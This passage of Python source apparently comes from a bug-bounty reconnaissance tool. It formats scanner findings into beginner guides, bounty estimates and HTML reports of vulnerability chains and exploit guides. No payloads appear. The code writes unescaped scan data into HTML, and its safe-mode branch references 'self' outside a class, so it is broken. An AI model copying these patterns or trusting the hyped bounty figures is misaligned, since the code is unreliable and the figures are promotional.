        print(f"Typical payout: {colored('$200 - $1,000', 'green', attrs=['bold'])} per domain")
        print("Pro tip: Test 10 subdomains = 10 reports = $2,000-$10,000!")
        print()
        
        print(colored("═" * 70, 'cyan'))
        print(colored(" READY TO TRY IT?", 'cyan', attrs=['bold']))
        print(colored("═" * 70, 'cyan'))
        print()
        print(f"Open: {colored(poc_file, 'green', attrs=['bold'])}")
        print()
        print("It's literally that easy! Just open the HTML file! ")
        print()
    
    def beginner_guide_xss(self, vuln):
        """Beginner guide for XSS"""
        url = vuln.get('url', '')
        param = vuln.get('param', 'search')
        
        print(colored("This is XSS - a more advanced vulnerability.", 'yellow'))
        print("For beginners, we recommend starting with:")
        print(f"  • {colored('Rate Limiting', 'cyan')} (easiest)")
        print(f"  • {colored('Security Headers', 'cyan')} (very easy)")
        print()
        print("But if you want to learn XSS, here's a simple explanation...")
        print()
        # Add basic XSS guide here if needed
    
    def beginner_guide_sqli(self, vuln):
        """Beginner guide for SQL Injection"""
        url = vuln.get('url', '')
        
        print(colored("This is SQL Injection - an advanced vulnerability.", 'yellow'))
        print("For beginners, we recommend starting with easier ones first.")
        print()
    
    def beginner_guide_generic(self, vuln):
        """Generic beginner guide"""
        vuln_type = vuln.get('type', 'Unknown')
        
        print(colored(f"This is {vuln_type} - a more advanced vulnerability.", 'yellow'))
        print("For beginners, we recommend starting with:")
        print(f"  • {colored('Rate Limiting', 'cyan')} (easiest)")
        print(f"  • {colored('Security Headers', 'cyan')} (very easy)")
        print()
    
    def show_beginner_chain_guide(self, chain):
        """Show beginner guide for chains"""
        
        print()
        print(colored("Chains are advanced - we recommend starting with individual", 'yellow'))
        print(colored("vulnerabilities first. Try Rate Limiting or Security Headers!", 'yellow'))
        print()
    
    def generate_report(self):
        """generate final intelligence report"""
        
        self.log("Generating intelligence report...", "info")
        
        # calculate duration
        duration = datetime.now() - self.start_time
        
        # calculate total estimated bounty
        total_bounty_min = 0
        total_bounty_max = 0
        
        for chain in self.chains:
            estimate = chain.get('bounty_estimate', '$0')
            min_val, max_val = self.parse_bounty_range(estimate)
            total_bounty_min += min_val
            total_bounty_max += max_val
        
        # create report data
        report = {
            'target': self.target,
            'scan_date': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
            'duration': str(duration).split('.')[0],
            'summary': {
                'shadow_assets': len(self.shadow_assets),
                'vulnerability_chains': len(self.chains),
                'exploit_guides': len(self.exploit_guides),
                'total_bounty_estimate': f'${total_bounty_min:,} - ${total_bounty_max:,}'
            },
            'shadow_assets': self.shadow_assets,
            'chains': self.chains,
            'exploit_guides': self.exploit_guides
        }
        
        # save JSON
        json_file = f"wxlf_f33d_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(json_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # save HTML
        html_file = f"wxlf_f33d_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        self.generate_html_report(html_file, report)
        
        # print summary with fancy blue theme
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue', attrs=['bold']))
        print(colored("║" + "  INTELLIGENCE REPORT COMPLETE".center(68) + "║", 'green', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'blue', attrs=['bold']))
        print()
        
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  SCAN SUMMARY".ljust(68) + "║", 'blue', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Target:          {colored(self.target, 'cyan', attrs=['bold'])}".ljust(77) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Duration:        {colored(str(duration).split('.')[0], 'yellow')}".ljust(87) + colored("║", 'blue'))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + "  FINDINGS".ljust(68) + colored("║", 'blue', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Shadow Assets:        {colored(str(len(self.shadow_assets)), 'yellow', attrs=['bold'])}".ljust(78) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Vulnerability Chains: {colored(str(len(self.chains)), 'red' if self.chains else 'yellow', attrs=['bold'])}".ljust(88) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Exploit Guides:       {colored(str(len(self.exploit_guides)), 'green', attrs=['bold'])}".ljust(88) + colored("║", 'blue'))
        
        if self.chains:
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue') + "  ESTIMATED TOTAL BOUNTY".ljust(68) + colored("║", 'blue', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            bounty_str = f"${total_bounty_min:,} - ${total_bounty_max:,}"
            print(colored("║", 'blue') + f"  {colored(bounty_str, 'green', attrs=['bold'])}".ljust(77) + colored("║", 'blue'))
        
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + "  REPORTS GENERATED".ljust(68) + colored("║", 'blue', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  {colored(json_file, 'cyan')} (JSON)".ljust(77) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  {colored(html_file, 'cyan')} (HTML)".ljust(77) + colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        print(colored("╔" + "═" * 68 + "╗", 'blue', attrs=['bold']))
        center_text = colored("  [ FEED ME MORE DATA ]", 'yellow', attrs=['bold'])
        print(colored("║", 'blue', attrs=['bold']) + center_text.center(68) + colored("║", 'blue', attrs=['bold']))
        print(colored("║", 'blue', attrs=['bold']) + "  Th3 Wxlf you F33d v1.0 • Advanced Intelligence Analysis  ".center(68) + colored("║", 'blue', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'blue', attrs=['bold']))
        print()
    
    def parse_bounty_range(self, estimate):
        """parse bounty estimate string to get min/max values"""
        try:
            numbers = re.findall(r'[\d,]+', estimate)
            if len(numbers) >= 2:
                min_val = int(numbers[0].replace(',', ''))
                max_val = int(numbers[1].replace(',', ''))
                return min_val, max_val
            elif len(numbers) == 1:
                val = int(numbers[0].replace(',', ''))
                return val, val
        except:
            pass
        return 0, 0
    
    def generate_html_report(self, filename, report):
        """generate fancy html report"""
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Th3 Wxlf you F33d - Intelligence Report</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #1a1f3a;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,255,255,0.1);
        }}
        h1 {{
            color: #00ffff;
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(0,255,255,0.5);
        }}
        .subtitle {{
            text-align: center;
            color: #888;
            margin-bottom: 30px;
        }}
        .summary {{
            background: #0f1425;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #00ffff;
            margin: 20px 0;
        }}
        .summary h2 {{
            color: #00ffff;
            margin-top: 0;
        }}
        .stat {{
            display: inline-block;
            margin: 10px 20px 10px 0;
        }}
        .stat-label {{
            color: #888;
            font-size: 0.9em;
        }}
        .stat-value {{
            color: #00ffff;
            font-size: 1.5em;
            font-weight: bold;
        }}
        .section {{
            margin: 30px 0;
        }}
        .section h2 {{
            color: #00ffff;
            border-bottom: 2px solid #00ffff;
            padding-bottom: 10px;
        }}
        .card {{
            background: #0f1425;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 4px solid #ff6b6b;
        }}
        .card.critical {{
            border-left-color: #ff0000;
        }}
        .card.high {{
            border-left-color: #ff6b6b;
        }}
        .card.medium {{
            border-left-color: #ffa500;
        }}
        .card.low {{
            border-left-color: #ffff00;
        }}
        .card-title {{
            color: #fff;
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .badge {{
            display: inline-block;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 0.85em;
            font-weight: bold;
            margin: 5px 5px 5px 0;
        }}
        .badge.critical {{
            background: #ff0000;
            color: #fff;
        }}
        .badge.high {{
            background: #ff6b6b;
            color: #fff;
        }}
        .badge.medium {{
            background: #ffa500;
            color: #000;
        }}
        .badge.low {{
            background: #ffff00;
            color: #000;
        }}
        .code {{
            background: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        .footer {{
            text-align: center;
            color: #666;
            margin-top: 50px;
            padding-top: 20px;
            border-top: 1px solid #333;
        }}
        ul {{
            list-style-type: none;
            padding-left: 0;
        }}
        li {{
            padding: 5px 0;
            padding-left: 20px;
            position: relative;
        }}
        li:before {{
            content: "▸";
            position: absolute;
            left: 0;
            color: #00ffff;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1> TH3 WXLF YOU F33D</h1>
        <div class="subtitle">Advanced Intelligence Analysis Report</div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <div class="stat">
                <div class="stat-label">Target</div>
                <div class="stat-value">{report['target']}</div>
            </div>
            <div class="stat">
                <div class="stat-label">Shadow Assets</div>
                <div class="stat-value">{report['summary']['shadow_assets']}</div>
            </div>
            <div class="stat">
                <div class="stat-label">Vulnerability Chains</div>
                <div class="stat-value">{report['summary']['vulnerability_chains']}</div>
            </div>
            <div class="stat">
                <div class="stat-label">Exploit Guides</div>
                <div class="stat-value">{report['summary']['exploit_guides']}</div>
            </div>
            <br>
            <div class="stat">
                <div class="stat-label">Est. Total Bounty</div>
                <div class="stat-value">{report['summary']['total_bounty_estimate']}</div>
            </div>
        </div>
"""
        
        # shadow assets section
        if report['shadow_assets']:
            html += """
        <div class="section">
            <h2>️ Shadow Assets Discovered</h2>
            <p>Hidden and forgotten assets that others might miss:</p>
"""
            for asset in report['shadow_assets']:
                severity_class = asset.get('severity', 'medium').lower()
                html += f"""
            <div class="card {severity_class}">
                <div class="card-title">{asset.get('type', 'Unknown')}</div>
                <div><strong>URL:</strong> {asset.get('url', 'N/A')}</div>
                <div><strong>Source:</strong> {asset.get('source', 'Unknown')}</div>
                <div><strong>Note:</strong> {asset.get('note', 'N/A')}</div>
            </div>
"""
            html += "        </div>\n"
        
        # chains section
        if report['chains']:
            html += """
        <div class="section">
            <h2>️ Vulnerability Chains</h2>
            <p>Combinations of vulnerabilities for maximum impact:</p>
"""
            for i, chain in enumerate(report['chains'], 1):
                severity = chain.get('severity', 'HIGH')
                severity_class = severity.lower()
                html += f"""
            <div class="card {severity_class}">
                <div class="card-title">Chain #{i}: {chain.get('name', 'Unknown')}</div>
                <span class="badge {severity_class}">{severity}</span>
                <span class="badge medium">Bounty: {chain.get('bounty_estimate', 'Unknown')}</span>
                <p><strong>Impact:</strong> {chain.get('impact', 'N/A')}</p>
                <p><strong>Steps:</strong> {len(chain.get('steps', []))} vulnerabilities chained</p>
                <div class="code">{chain.get('explanation', 'See steps above').replace(chr(10), '<br>')}</div>
            </div>
"""
            html += "        </div>\n"
        
        # exploit guides section (show top 5)
        if report['exploit_guides']:
            html += """
        <div class="section">
            <h2> Top Exploitation Guides</h2>
            <p>Detailed exploitation paths for maximum success:</p>
"""
            for i, guide in enumerate(report['exploit_guides'][:5], 1):
                severity = guide.get('severity', 'HIGH')
                severity_class = severity.lower()
                html += f"""
            <div class="card {severity_class}">
                <div class="card-title">Guide #{i}: {guide.get('title', 'Unknown')}</div>
                <span class="badge {severity_class}">{severity}</span>
                <span class="badge medium">Bounty: {guide.get('bounty_estimate', 'Unknown')}</span>
                <span class="badge low">Difficulty: {guide.get('difficulty', 'Unknown')}</span>
                <p><strong>Exploitation Steps:</strong></p>
                <ul>
"""
                for step in guide.get('steps', []):
                    html += f"                    <li>{step}</li>\n"
                
                html += """
                </ul>
            </div>
"""
            html += "        </div>\n"
        
        # footer
        html += f"""
        <div class="footer">
            <p>Report generated on {report['scan_date']}</p>
            <p>Scan duration: {report['duration']}</p>
            <p>Made with  by GhxstSh3ll • Th3 Wxlf you F33d v1.0</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open(filename, 'w') as f:
            f.write(html)
        
        self.log(f"HTML report saved: {filename}", "success")


def main():
    # create instance
    wxlf = WxlfF33d()
    
    # check for input file
    if len(sys.argv) > 1:
        input_file = sys.argv[1]
        if wxlf.load_data(input_file):
            wxlf.run()  # normal flow with startup
    else:
        # No file provided - check current directory for Dark Wxlf files
        import glob
        
        # Look for common Dark Wxlf output patterns
        patterns = [
            'dark_wxlf*.txt',
            'dark_wxlf*.json', 
            '*_scan*.txt',
            '*_vulns*.txt',
            'vulnerabilities*.txt',
            'scan_results*.txt'
        ]
        
        available_files = []
        for pattern in patterns:
            available_files.extend(glob.glob(pattern))
        
        # Remove duplicates
        available_files = list(set(available_files))
        
        if available_files:
            # Found Dark Wxlf files - show selection menu
            print()
            print(colored("╔" + "═" * 68 + "╗", 'blue'))
            print(colored("║" + "  DARK WXLF FILES DETECTED".ljust(68) + "║", 'cyan', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue'))
            
            for i, filename in enumerate(available_files[:10], 1):  # Show up to 10
                # Get file size
                import os
                size = os.path.getsize(filename)
                size_str = f"{size/1024:.1f}KB" if size < 1024*1024 else f"{size/(1024*1024):.1f}MB"
                
                # Get file modified time
                import time
                mtime = os.path.getmtime(filename)
                time_str = time.strftime('%Y-%m-%d %H:%M', time.localtime(mtime))
                
                print(colored("║  ", 'blue') + colored(f"{i}", 'cyan', attrs=['bold']) + f"  {filename[:35]:<35}".ljust(38) + colored("║", 'blue'))
                print(colored("║     ", 'blue') + f"Size: {size_str:<10} Modified: {time_str}".ljust(60) + colored("║", 'blue'))
            
            if len(available_files) > 10:
                print(colored("║     ", 'blue') + f"... and {len(available_files) - 10} more files".ljust(60) + colored("║", 'blue'))
            
            print(colored("║", 'blue'))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║  ", 'blue') + colored("M", 'yellow', attrs=['bold']) + "  Manual Input      " + colored("→", 'blue') + "  Enter data manually".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("9", 'green', attrs=['bold']) + "  Bug Bounty Mode   " + colored("→", 'blue') + "  Enable safe mode for bug bounty programs".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("0", 'red', attrs=['bold']) + "  Exit              " + colored("→", 'blue') + "  Quit".ljust(45) + colored("║", 'blue'))
            print(colored("║", 'blue'))
            print(colored("╚" + "═" * 68 + "╝", 'blue'))
            print()
            
            choice = input(colored("[?] Select file (or M for manual): ", 'cyan', attrs=['bold'])).strip()
            
            if choice.upper() == 'M':
                # Manual input
                wxlf.load_data()
                wxlf.run(skip_startup=True)

            elif choice == '9':
                # Bug Bounty Safe Mode Configuration
                print()
                print(colored("╔" + "═" * 68 + "╗", 'green'))
                print(colored("║  BUG BOUNTY SAFE MODE CONFIGURATION".center(70) + "║", 'green', attrs=['bold']))
                print(colored("╠" + "═" * 68 + "╣", 'green'))
                print(colored("║", 'green'))
                print(colored("║  This mode ensures compliance with bug bounty programs:", 'white'))
                print(colored("║", 'green'))
                print(colored("║  ENABLED PROTECTIONS:", 'yellow', attrs=['bold']))
                print(colored("║    • Rate limiting (10 requests/second default)", 'white'))
                print(colored("║    • Scope filtering (only test in-scope targets)", 'white'))
                print(colored("║    • Request delays to avoid DoS flags", 'white'))
                print(colored("║    • robots.txt respect", 'white'))
                print(colored("║    • Request counting and logging", 'white'))
                print(colored("║", 'green'))
                print(colored("╚" + "═" * 68 + "╝", 'green'))
                print()
                
                confirm = input(colored("[?] Enable Bug Bounty Safe Mode? (y/n): ", 'yellow')).lower()
                if confirm == 'y':
                    # Configure rate limit
                    print()
                    rate_input = input(colored("[?] Max requests per second (default 10, max 50): ", 'cyan'))
                    if rate_input.isdigit():
                        rate = min(int(rate_input), 50)
                        self.max_requests_per_second = rate
                        self.request_delay = 1.0 / rate
                    
                    # Configure scope
                    print()
                    print(colored("[*] Configure scope (one domain per line, empty to finish)", 'cyan'))
                    print(colored("    Example: *.example.com or api.example.com", 'white'))
                    print()
                    
                    while True:
                        scope_input = input(colored("    In-scope domain: ", 'green')).strip()
                        if not scope_input:
                            break
                        self.in_scope.append(scope_input)
                        print(colored(f"    Added: {scope_input}", 'green'))
                    
                    if self.in_scope:
                        print()
                        print(colored("[*] Out-of-scope domains (optional)", 'cyan'))
                        while True:
                            out_input = input(colored("    Out-of-scope domain: ", 'red')).strip()
                            if not out_input:
                                break
                            self.out_of_scope.append(out_input)
                            print(colored(f"    Excluded: {out_input}", 'red'))
                    
                    # Enable mode
                    self.enable_bug_bounty_mode()
                    
                    print(colored("╔" + "═" * 68 + "╗", 'green'))
                    print(colored("║  SAFE MODE ACTIVE".center(70) + "║", 'green', attrs=['bold']))
                    print(colored("╠" + "═" * 68 + "╣", 'green'))
                    print(colored("║", 'green'))
                    print(colored(f"║  Rate Limit: {self.max_requests_per_second} req/s".ljust(70) + "║", 'white'))
                    print(colored(f"║  In-Scope: {len(self.in_scope)} domains".ljust(70) + "║", 'white'))
                    print(colored(f"║  Out-of-Scope: {len(self.out_of_scope)} domains".ljust(70) + "║", 'white'))
                    print(colored("║", 'green'))
                    print(colored("╚" + "═" * 68 + "╝", 'green'))
                    print()
                    
                    input(colored("[*] Press Enter to continue...", 'yellow'))
            elif choice == '0':
                print(colored("[!] Exiting...", 'yellow'))
                sys.exit(0)
            else:
                try:
                    file_num = int(choice)
                    if 1 <= file_num <= len(available_files):
                        selected_file = available_files[file_num - 1]
                        print()
                        print(colored(f"[*] Loading: {selected_file}", 'cyan'))
                        if wxlf.load_data(selected_file):
                            wxlf.run()
                    else:
                        print(colored("[!] Invalid selection", 'red'))
                        sys.exit(1)
                except ValueError:
                    print(colored("[!] Invalid input", 'red'))
                    sys.exit(1)
        else:
            # No files found - offer manual input or file path
            print()
            print(colored("╔" + "═" * 68 + "╗", 'blue'))
            print(colored("║" + "  NO DARK WXLF FILES DETECTED".ljust(68) + "║", 'yellow', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue'))
            print(colored("║  No scan files found in current directory.                       ║", 'white'))
            print(colored("║", 'blue'))
            print(colored("║  Options:                                                        ║", 'white'))
            print(colored("║  1. Run: python3 twyf.py <scan_file.txt>                        ║", 'cyan'))
            print(colored("║  2. Copy Dark Wxlf output to current directory                   ║", 'cyan'))
            print(colored("║  3. Enter data manually (press Enter)                            ║", 'cyan'))
            print(colored("║", 'blue'))
            print(colored("╚" + "═" * 68 + "╝", 'blue'))
            print()
            
            choice = input(colored("[?] Press Enter for manual input or type file path: ", 'cyan', attrs=['bold'])).strip()
            
            if choice:
                # User provided file path
                if wxlf.load_data(choice):
                    wxlf.run()
                else:
                    print(colored("[!] Failed to load file", 'red'))
                    sys.exit(1)
            else:
                # Manual input
                wxlf.load_data()
                wxlf.run(skip_startup=True)


if __name__ == "__main__":
    # disable ssl warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    try:
        main()
    except KeyboardInterrupt:
        print()
        print(colored("[!] Interrupted by user", 'yellow'))
        sys.exit(0)
